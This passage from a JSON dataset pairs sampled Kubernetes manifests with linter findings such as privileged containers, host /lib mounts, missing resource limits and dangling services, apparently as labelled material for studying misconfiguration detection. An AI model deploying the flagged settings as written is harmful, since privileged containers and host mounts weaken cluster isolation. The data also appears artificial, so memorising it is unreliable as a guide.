fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/xlnet-imdb/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-xlnet-imdb-conv-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"monitor\" has memory limit 0"
  },
  {
    "id": "8038",
    "manifest_path": "data/manifests/the_stack_sample/sample_2973.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v3-8\n    benchmarkId: tf-nightly-xlnet-imdb-conv-v3-8\n    frameworkVersion: tf-nightly\n    mode: conv\n    model: xlnet-imdb\n  name: tf-nightly-xlnet-imdb-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/nlp/xlnet/run_classifier.py\n          - --strategy_type=tpu\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --train_tfrecord_path=$(XLNET_IMDB_DIR)/spiece.model.len-512.train.tf_record\n          - --test_tfrecord_path=$(XLNET_IMDB_DIR)/spiece.model.len-512.dev.eval.tf_record\n          - --init_checkpoint=$(XLNET_CHECKPOINT_DIR)/xlnet_model.ckpt\n          - --model_dir=$(MODEL_DIR)\n          - --test_data_size=25024\n          - --seq_len=512\n          - --n_layer=24\n          - --d_model=1024\n          - --d_embed=1024\n          - --n_head=16\n          - --d_head=64\n          - --d_inner=4096\n          - --untie_r=true\n          - --n_class=2\n          - --ff_activation=gelu\n          - --learning_rate=2e-5\n          - --warmup_steps=500\n          - --iterations=500\n          - --bi_data=false\n          - --summary_type=last\n          - --train_batch_size=32\n          - --test_batch_size=32\n          - --train_steps=4000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/xlnet-imdb/conv/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/xlnet-imdb/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-xlnet-imdb-conv-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"publisher\" has memory limit 0"
  },
  {
    "id": "8039",
    "manifest_path": "data/manifests/the_stack_sample/sample_2973.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v3-8\n    benchmarkId: tf-nightly-xlnet-imdb-conv-v3-8\n    frameworkVersion: tf-nightly\n    mode: conv\n    model: xlnet-imdb\n  name: tf-nightly-xlnet-imdb-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/nlp/xlnet/run_classifier.py\n          - --strategy_type=tpu\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --train_tfrecord_path=$(XLNET_IMDB_DIR)/spiece.model.len-512.train.tf_record\n          - --test_tfrecord_path=$(XLNET_IMDB_DIR)/spiece.model.len-512.dev.eval.tf_record\n          - --init_checkpoint=$(XLNET_CHECKPOINT_DIR)/xlnet_model.ckpt\n          - --model_dir=$(MODEL_DIR)\n          - --test_data_size=25024\n          - --seq_len=512\n          - --n_layer=24\n          - --d_model=1024\n          - --d_embed=1024\n          - --n_head=16\n          - --d_head=64\n          - --d_inner=4096\n          - --untie_r=true\n          - --n_class=2\n          - --ff_activation=gelu\n          - --learning_rate=2e-5\n          - --warmup_steps=500\n          - --iterations=500\n          - --bi_data=false\n          - --summary_type=last\n          - --train_batch_size=32\n          - --test_batch_size=32\n          - --train_steps=4000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/xlnet-imdb/conv/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/xlnet-imdb/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-xlnet-imdb-conv-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"train\" has memory limit 0"
  },
  {
    "id": "8040",
    "manifest_path": "data/manifests/the_stack_sample/sample_2974.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: keycloak\n  labels:\n    app.kubernetes.io/name: keycloak\nspec:\n  type: ClusterIP\n  ports:\n  - name: tcp-keycloak\n    port: 8080\n    targetPort: tcp-keycloak\n  selector:\n    app.kubernetes.io/name: keycloak\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/name:keycloak])"
  },
  {
    "id": "8041",
    "manifest_path": "data/manifests/the_stack_sample/sample_2975.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: biqa-template-service\nspec:\n  type: NodePort\n  ports:\n  - port: 80\n    targetPort: 8080\n    nodePort: 31700\n    protocol: TCP\n  selector:\n    app: biqa-api\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:biqa-api])"
  },
  {
    "id": "8042",
    "manifest_path": "data/manifests/the_stack_sample/sample_2977.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\n    prometheus: default\nspec:\n  selector:\n    app: nginx\n  type: ClusterIP\n  ports:\n  - name: http\n    protocol: TCP\n    port: 80\n    targetPort: 8000\n  - name: metrics\n    protocol: TCP\n    port: 9113\n    targetPort: 9113\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:nginx])"
  },
  {
    "id": "8043",
    "manifest_path": "data/manifests/the_stack_sample/sample_2979.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nse-kernel\n  labels:\n    app: nse-kernel\nspec:\n  selector:\n    matchLabels:\n      app: nse-kernel\n  template:\n    metadata:\n      labels:\n        app: nse-kernel\n        spiffe.io/spiffe-id: 'true'\n    spec:\n      containers:\n      - name: nse\n        image: ghcr.io/networkservicemesh/ci/cmd-nse-vlan-vpp:fae8d3f\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        env:\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NSM_LOG_LEVEL\n          value: TRACE\n        - name: NSM_CONNECT_TO\n          value: unix:///var/lib/networkservicemesh/nsm.io.sock\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm-socket\n          mountPath: /var/lib/networkservicemesh\n          readOnly: true\n        resources:\n          requests:\n            cpu: 150m\n          limits:\n            memory: 400Mi\n            cpu: 500m\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm-socket\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nse\" does not have a read-only root file system"
  },
  {
    "id": "8044",
    "manifest_path": "data/manifests/the_stack_sample/sample_2979.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nse-kernel\n  labels:\n    app: nse-kernel\nspec:\n  selector:\n    matchLabels:\n      app: nse-kernel\n  template:\n    metadata:\n      labels:\n        app: nse-kernel\n        spiffe.io/spiffe-id: 'true'\n    spec:\n      containers:\n      - name: nse\n        image: ghcr.io/networkservicemesh/ci/cmd-nse-vlan-vpp:fae8d3f\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        env:\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NSM_LOG_LEVEL\n          value: TRACE\n        - name: NSM_CONNECT_TO\n          value: unix:///var/lib/networkservicemesh/nsm.io.sock\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm-socket\n          mountPath: /var/lib/networkservicemesh\n          readOnly: true\n        resources:\n          requests:\n            cpu: 150m\n          limits:\n            memory: 400Mi\n            cpu: 500m\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm-socket\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: DirectoryOrCreate\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"nse\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "8045",
    "manifest_path": "data/manifests/the_stack_sample/sample_2979.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nse-kernel\n  labels:\n    app: nse-kernel\nspec:\n  selector:\n    matchLabels:\n      app: nse-kernel\n  template:\n    metadata:\n      labels:\n        app: nse-kernel\n        spiffe.io/spiffe-id: 'true'\n    spec:\n      containers:\n      - name: nse\n        image: ghcr.io/networkservicemesh/ci/cmd-nse-vlan-vpp:fae8d3f\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        env:\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NSM_LOG_LEVEL\n          value: TRACE\n        - name: NSM_CONNECT_TO\n          value: unix:///var/lib/networkservicemesh/nsm.io.sock\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm-socket\n          mountPath: /var/lib/networkservicemesh\n          readOnly: true\n        resources:\n          requests:\n            cpu: 150m\n          limits:\n            memory: 400Mi\n            cpu: 500m\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm-socket\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: DirectoryOrCreate\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"nse\" is privileged"
  },
  {
    "id": "8046",
    "manifest_path": "data/manifests/the_stack_sample/sample_2979.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nse-kernel\n  labels:\n    app: nse-kernel\nspec:\n  selector:\n    matchLabels:\n      app: nse-kernel\n  template:\n    metadata:\n      labels:\n        app: nse-kernel\n        spiffe.io/spiffe-id: 'true'\n    spec:\n      containers:\n      - name: nse\n        image: ghcr.io/networkservicemesh/ci/cmd-nse-vlan-vpp:fae8d3f\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        env:\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NSM_LOG_LEVEL\n          value: TRACE\n        - name: NSM_CONNECT_TO\n          value: unix:///var/lib/networkservicemesh/nsm.io.sock\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm-socket\n          mountPath: /var/lib/networkservicemesh\n          readOnly: true\n        resources:\n          requests:\n            cpu: 150m\n          limits:\n            memory: 400Mi\n            cpu: 500m\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm-socket\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nse\" is not set to runAsNonRoot"
  },
  {
    "id": "8047",
    "manifest_path": "data/manifests/the_stack_sample/sample_2981.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: service-itau-erp\nspec:\n  selector:\n    app: deploy-itau-erp\n  ports:\n  - port: 9091\n    targetPort: 9091\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:deploy-itau-erp])"
  },
  {
    "id": "8048",
    "manifest_path": "data/manifests/the_stack_sample/sample_2982.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app.kubernetes.io/component: server\n    app.kubernetes.io/managed-by: karavel\n    app.kubernetes.io/name: argocd-server\n    app.kubernetes.io/part-of: argocd\n    app.kubernetes.io/version: 2.2.0\n    karavel.io/component-name: argocd\n    karavel.io/component-version: 0.1.0-SNAPSHOT\n  name: argocd-server\n  namespace: argocd\nspec:\n  ports:\n  - name: server\n    port: 8080\n    protocol: TCP\n    targetPort: server\n  selector:\n    app.kubernetes.io/component: server\n    app.kubernetes.io/managed-by: karavel\n    app.kubernetes.io/name: argocd-server\n    app.kubernetes.io/part-of: argocd\n    karavel.io/component-name: argocd\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/component:server app.kubernetes.io/managed-by:karavel app.kubernetes.io/name:argocd-server app.kubernetes.io/part-of:argocd karavel.io/component-name:argocd])"
  },
  {
    "id": "8049",
    "manifest_path": "data/manifests/the_stack_sample/sample_2984.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    io.kompose.service: edgex-support-scheduler\n  name: edgex-support-scheduler\nspec:\n  ports:\n  - name: '48085'\n    port: 48085\n    targetPort: 48085\n  selector:\n    io.kompose.service: edgex-support-scheduler\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[io.kompose.service:edgex-support-scheduler])"
  },
  {
    "id": "8050",
    "manifest_path": "data/manifests/the_stack_sample/sample_2985.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9060\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8051",
    "manifest_path": "data/manifests/the_stack_sample/sample_2985.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9060\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "8052",
    "manifest_path": "data/manifests/the_stack_sample/sample_2985.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9060\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "8053",
    "manifest_path": "data/manifests/the_stack_sample/sample_2985.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9060\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "8054",
    "manifest_path": "data/manifests/the_stack_sample/sample_2985.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9060\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "8055",
    "manifest_path": "data/manifests/the_stack_sample/sample_2986.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: train-dt\nspec:\n  securityContext:\n    runAsUser: 1224\n  volumes:\n  - name: home\n    persistentVolumeClaim:\n      claimName: home\n  - name: tools\n    persistentVolumeClaim:\n      claimName: tools\n  - name: scratch6\n    persistentVolumeClaim:\n      claimName: scratch6\n  - hostPath:\n      path: /usr/lib/\n    name: usrlib\n  - hostPath:\n      path: /usr/bin\n    name: bin\n  - hostPath:\n      path: /lib\n    name: lib\n  containers:\n  - name: local-image-container\n    imagePullPolicy: IfNotPresent\n    image: ubuntu:16.04\n    command:\n    - /bin/bash\n    - /scratch/scratch6/jonathanvevance/projects/predicting_fgroups_ddp/kube_files/train_dt_run.sh\n    resources:\n      limits:\n        nvidia.com/gpu: 1\n        memory: 50Gi\n        cpu: '1'\n      requests:\n        memory: 50Gi\n        cpu: '1'\n    volumeMounts:\n    - mountPath: /storage/home\n      name: home\n    - mountPath: /tools\n      name: tools\n    - mountPath: /scratch/scratch6\n      name: scratch6\n    - mountPath: /usr/lib/\n      name: usrlib\n    - mountPath: /usr/bin/\n      name: bin\n    - mountPath: /lib\n      name: lib\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"local-image-container\" does not have a read-only root file system"
  },
  {
    "id": "8056",
    "manifest_path": "data/manifests/the_stack_sample/sample_2986.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: train-dt\nspec:\n  securityContext:\n    runAsUser: 1224\n  volumes:\n  - name: home\n    persistentVolumeClaim:\n      claimName: home\n  - name: tools\n    persistentVolumeClaim:\n      claimName: tools\n  - name: scratch6\n    persistentVolumeClaim:\n      claimName: scratch6\n  - hostPath:\n      path: /usr/lib/\n    name: usrlib\n  - hostPath:\n      path: /usr/bin\n    name: bin\n  - hostPath:\n      path: /lib\n    name: lib\n  containers:\n  - name: local-image-container\n    imagePullPolicy: IfNotPresent\n    image: ubuntu:16.04\n    command:\n    - /bin/bash\n    - /scratch/scratch6/jonathanvevance/projects/predicting_fgroups_ddp/kube_files/train_dt_run.sh\n    resources:\n      limits:\n        nvidia.com/gpu: 1\n        memory: 50Gi\n        cpu: '1'\n      requests:\n        memory: 50Gi\n        cpu: '1'\n    volumeMounts:\n    - mountPath: /storage/home\n      name: home\n    - mountPath: /tools\n      name: tools\n    - mountPath: /scratch/scratch6\n      name: scratch6\n    - mountPath: /usr/lib/\n      name: usrlib\n    - mountPath: /usr/bin/\n      name: bin\n    - mountPath: /lib\n      name: lib\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/lib\" is mounted on container \"local-image-container\""
  },
  {
    "id": "8057",
    "manifest_path": "data/manifests/the_stack_sample/sample_2987.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20200908-94d8b4dfcd\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"hook\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "8058",
    "manifest_path": "data/manifests/the_stack_sample/sample_2987.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20200908-94d8b4dfcd\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n",
    "policy_id": "no-anti-affinity",
